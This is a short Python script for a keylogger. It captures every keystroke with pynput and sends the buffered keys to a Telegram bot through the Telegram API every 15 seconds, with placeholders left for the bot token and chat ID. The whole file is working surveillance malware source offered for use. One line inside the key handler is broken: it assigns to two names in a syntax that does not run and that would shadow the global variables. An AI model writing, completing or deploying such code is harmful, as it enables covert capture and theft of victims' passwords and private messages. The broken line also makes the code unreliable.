from pynput import keyboard
import time
import requests

# instead of email, use telegram instead for real time monitoring
def send_to_telegram(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': message}
    try:
        requests.post(url, data=payload)
    except requests.RequestException as e:
        print(f"Error sending message to Telegram: {e}")

# add telegram bot detail here
TELEGRAM_TOKEN = "INSTERT BOT TOKEN HERE"
CHAT_ID = "INSERT BOT CHAT ID HERE"

# buffer to store key logs to increase performance
log_buffer = []

# time variables for delay
SEND_INTERVAL = 15
last_sent_time = time.time()

def key_pressed(key):
    last_sent_time = 0, log_buffer = 0
    try:
        char = key.char
        if char:
            log_buffer.append(char)
    except AttributeError:
        special_key = f"[{key}]"
        log_buffer.append(special_key)
    
    # time delay for sending logged keys to telegram
    if time.time() - last_sent_time >= SEND_INTERVAL:
        if log_buffer:
            # Send the log data via Telegram
            message = ''.join(log_buffer)
            send_to_telegram(TELEGRAM_TOKEN, CHAT_ID, f"Keylogger data:\n{message}")
            log_buffer.clear()  # Clear the buffer after sending
            last_sent_time = time.time()

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()  

